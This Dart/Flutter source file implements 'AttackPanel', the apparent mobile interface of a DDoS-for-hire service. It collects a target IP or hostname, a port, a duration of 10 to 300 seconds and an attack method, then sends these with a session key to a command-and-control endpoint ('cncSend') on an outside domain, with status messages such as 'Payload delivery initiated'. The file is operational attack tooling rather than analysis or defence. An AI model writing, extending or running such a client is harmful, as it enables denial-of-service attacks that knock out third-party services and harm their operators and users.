import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:flutter/services.dart';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "https://alfa.nullxteam.fun";

  late AnimationController _pulseController;
  late AnimationController _fadeController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _fadeAnimation;

  String selectedDoosId = "";
  double attackDuration = 60;
  bool isAttacking = false;

  // UBAH: Theme Colors ke Deep Green & Black
  final Color bgBlack = const Color(0xFF050505);
  final Color accentGreen = const Color(0xFF1B5E20);
  final Color lightGreen = const Color(0xFF2ECC71);
  final Color glassBorder = Colors.white.withOpacity(0.08);
  final Color glassBg = Colors.white.withOpacity(0.03);

  @override
  void initState() {
    super.initState();

    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1200),
      vsync: this,
    )..repeat(reverse: true);

    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 800),
      vsync: this,
    );

    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.03).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeIn),
    );

    _fadeController.forward();

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _fadeController.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }

  // --- LOGIC ---

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty) {
      _showNotification("ACCESS DENIED", "Target specification missing.", Colors.redAccent);
      return;
    }

    setState(() => isAttacking = true);
    HapticFeedback.heavyImpact();

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);

      if (data["valid"] == false) {
        _showNotification("UNAUTHORIZED", "System session has expired.", Colors.redAccent);
      } else if (data["cooldown"] == true) {
        _showNotification("COOLDOWN", "Thermal protection active. Wait.", Colors.orangeAccent);
      } else {
        _showNotification("ENGAGED", "Payload delivery initiated to $target.", lightGreen);
      }
    } catch (_) {
      _showNotification("SYSTEM ERROR", "Connection to CNC master lost.", Colors.redAccent);
    }

    setState(() => isAttacking = false);
  }

  void _showNotification(String title, String msg, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        content: _buildGlassContainer(
          borderColor: color.withOpacity(0.4),
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Icon(Icons.terminal_rounded, color: color, size: 20),
              const SizedBox(width: 15),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text(title, style: TextStyle(color: color, fontWeight: FontWeight.bold, fontSize: 13, letterSpacing: 1)),
                    Text(msg, style: const TextStyle(color: Colors.white70, fontSize: 11)),
                  ],
                ),
              ),
            ],
          ),
        ),
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  // --- UI COMPONENTS ---

  Widget _buildGlassContainer({required Widget child, EdgeInsetsGeometry? padding, Color? borderColor}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(24),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: Container(
          padding: padding,
          decoration: BoxDecoration(
            color: glassBg,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: borderColor ?? glassBorder),
          ),
          child: child,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: bgBlack,
      body: Stack(
        children: [
          // Background Glow Orbs
          Positioned(top: -100, right: -50, child: _buildGlowOrb(300, accentGreen.withOpacity(0.15))),
          Positioned(bottom: -50, left: -50, child: _buildGlowOrb(200, lightGreen.withOpacity(0.05))),

          SafeArea(
            child: FadeTransition(
              opacity: _fadeAnimation,
              child: SingleChildScrollView(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 20),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _buildTopNav(),
                    const SizedBox(height: 30),
                    _buildStatsHeader(),
                    const SizedBox(height: 25),
                    _buildConfigForm(isIcmp),
                    const SizedBox(height: 30),
                    _buildLaunchButton(),
                    const SizedBox(height: 40),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTopNav() {
    return Row(
      children: [
        GestureDetector(
          onTap: () => Navigator.pop(context),
          child: _buildGlassContainer(
            padding: const EdgeInsets.all(10),
            child: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
          ),
        ),
        const SizedBox(width: 15),
        const Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text("CNC PANEL", style: TextStyle(color: Colors.white, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 2)),
            Text("Advanced Vector Control", style: TextStyle(color: Colors.white38, fontSize: 10, letterSpacing: 1)),
          ],
        ),
        const Spacer(),
        _buildLiveIndicator(),
      ],
    );
  }

  Widget _buildLiveIndicator() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: Colors.redAccent.withOpacity(0.05),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: Colors.redAccent.withOpacity(0.2)),
      ),
      child: Row(
        children: [
          Container(width: 6, height: 6, decoration: const BoxDecoration(color: Colors.redAccent, shape: BoxShape.circle)),
          const SizedBox(width: 6),
          const Text("SERVER LIVE", style: TextStyle(color: Colors.redAccent, fontSize: 9, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _buildStatsHeader() {
    return _buildGlassContainer(
      padding: const EdgeInsets.all(20),
      borderColor: lightGreen.withOpacity(0.15),
      child: Row(
        children: [
          _buildPulseOrb(),
          const SizedBox(width: 20),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text("STRIKE COORDINATOR", style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
                const SizedBox(height: 4),
                Text("Ready to synchronize with ${widget.listDoos.length} attack methods", style: TextStyle(color: lightGreen.withOpacity(0.5), fontSize: 11)),
              ],
            ),
          )
        ],
      ),
    );
  }

  Widget _buildPulseOrb() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: lightGreen.withOpacity(0.1),
        shape: BoxShape.circle,
        border: Border.all(color: lightGreen.withOpacity(0.2)),
      ),
      child: Icon(Icons.radar_rounded, color: lightGreen, size: 28),
    );
  }

  Widget _buildConfigForm(bool isIcmp) {
    return _buildGlassContainer(
      padding: const EdgeInsets.all(24),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildInputLabel("NETWORK SPECIFICATION", Icons.hub_rounded),
          const SizedBox(height: 18),
          _buildCyberField(targetController, "IPv4 / Hostname Target", Icons.language_rounded),
          const SizedBox(height: 15),
          _buildCyberField(portController, isIcmp ? "Port: AUTO_ICMP" : "Service Port (0-65535)", Icons.settings_ethernet_rounded, enabled: !isIcmp),
          const SizedBox(height: 25),
          _buildInputLabel("EXECUTION PARAMETERS", Icons.av_timer_rounded),
          const SizedBox(height: 15),
          _buildDurationSlider(),
          const SizedBox(height: 25),
          _buildInputLabel("ATTACK PROTOCOL", Icons.security_rounded),
          const SizedBox(height: 15),
          _buildMethodDropdown(),
        ],
      ),
    );
  }

  Widget _buildInputLabel(String label, IconData icon) {
    return Row(
      children: [
        Icon(icon, color: lightGreen, size: 14),
        const SizedBox(width: 10),
        Text(label, style: TextStyle(color: lightGreen.withOpacity(0.4), fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
      ],
    );
  }

  Widget _buildCyberField(TextEditingController controller, String hint, IconData icon, {bool enabled = true}) {
    return TextField(
      controller: controller,
      enabled: enabled,
      style: const TextStyle(color: Colors.white, fontSize: 14, fontFamily: 'monospace'),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: TextStyle(color: Colors.white.withOpacity(0.15), fontSize: 13),
        prefixIcon: Icon(icon, color: enabled ? lightGreen.withOpacity(0.6) : Colors.white10, size: 18),
        filled: true,
        fillColor: Colors.black.withOpacity(0.3),
        contentPadding: const EdgeInsets.symmetric(vertical: 18),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(15), borderSide: BorderSide.none),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(15), borderSide: BorderSide(color: glassBorder)),
      ),
    );
  }

  Widget _buildDurationSlider() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.2),
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: glassBorder),
      ),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const Text("TIME FRAME", style: TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold)),
              Text("${attackDuration.toInt()} SEC", style: TextStyle(color: lightGreen, fontWeight: FontWeight.bold, fontSize: 14, fontFamily: 'monospace')),
            ],
          ),
          const SizedBox(height: 5),
          SliderTheme(
            data: SliderTheme.of(context).copyWith(
              activeTrackColor: lightGreen,
              inactiveTrackColor: Colors.white10,
              thumbColor: Colors.white,
              overlayColor: lightGreen.withOpacity(0.2),
              trackHeight: 2,
            ),
            child: Slider(
              value: attackDuration,
              min: 10, max: 300,
              divisions: 29,
              onChanged: (v) => setState(() => attackDuration = v),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMethodDropdown() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: glassBorder),
      ),
      child: DropdownButtonHideUnderline(
        child: DropdownButton<String>(
          dropdownColor: const Color(0xFF0A0A0A),
          value: selectedDoosId,
          isExpanded: true,
          icon: Icon(Icons.expand_more_rounded, color: lightGreen),
          style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w600),
          items: widget.listDoos.map((doos) {
            return DropdownMenuItem<String>(
              value: doos['ddos_id'],
              child: Text(doos['ddos_name'].toUpperCase(), style: const TextStyle(letterSpacing: 1)),
            );
          }).toList(),
          onChanged: (v) => setState(() => selectedDoosId = v!),
        ),
      ),
    );
  }

  Widget _buildLaunchButton() {
    return AnimatedBuilder(
      animation: _pulseAnimation,
      builder: (context, child) {
        return Transform.scale(
          scale: isAttacking ? 0.98 : _pulseAnimation.value,
          child: GestureDetector(
            onTap: isAttacking ? null : _sendDoos,
            child: Container(
              height: 70,
              width: double.infinity,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [accentGreen, lightGreen],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(20),
                boxShadow: [
                  BoxShadow(color: lightGreen.withOpacity(0.2), blurRadius: 25, offset: const Offset(0, 10))
                ],
              ),
              child: Center(
                child: isAttacking
                    ? const SizedBox(width: 25, height: 25, child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2))
                    : const Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.bolt_rounded, color: Colors.black, size: 28),
                    SizedBox(width: 12),
                    Text("EXECUTE SEQUENCE", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold, fontSize: 16, letterSpacing: 1.5)),
                  ],
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildGlowOrb(double size, Color color) {
    return Container(
      width: size, height: size,
      decoration: BoxDecoration(shape: BoxShape.circle, color: color, boxShadow: [BoxShadow(color: color, blurRadius: 100, spreadRadius: 40)]),
    );
  }
}